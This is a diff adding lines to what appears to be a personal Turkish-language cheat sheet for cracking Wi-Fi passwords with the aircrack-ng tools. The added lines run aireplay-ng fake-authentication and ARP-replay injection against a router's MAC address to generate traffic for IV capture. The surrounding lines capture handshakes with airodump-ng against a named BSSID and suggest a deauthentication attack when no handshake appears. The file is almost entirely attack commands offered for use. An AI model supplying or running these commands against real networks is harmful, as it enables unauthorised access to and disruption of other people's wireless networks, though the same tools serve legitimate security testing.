@@ -9,6 +9,11 @@ WPA (Wi-Fi Protected Access), kablosuz ağlarda veri güvenliğini sağlamak iç
 
 //terminalle password kırma
 
+//Sahte Yetkilendirme ile ağda işlem yoksa sahte işlem yapıp IV alınabilir ve airodump yapılabilir
+~ip addr //ip adres
+~aireplay-ng --fakeauth 0 -a {modem mac} -h {kendi mac} wlan0mon
+~aireplay-ng --arpreplay 0 -b {modem mac} -h {kendi mac} wlan0mon //ağda işlem yapılmış gibi
+
 ~iwconfig //monitor moda geç
 ~airodump-ng wlan0mon //ağ bilgileri al
 ~airodump-ng --channel 9 --bssid E4:C3:2A:B7:23:90 --write airodumptest wlan0mon //handshake üstte çıkar.Çıkmazsa ağdan atma saldırısı yap. Sonra çıkacaktır. handshake çıkmış halde write yazdırdığın dosya lazım
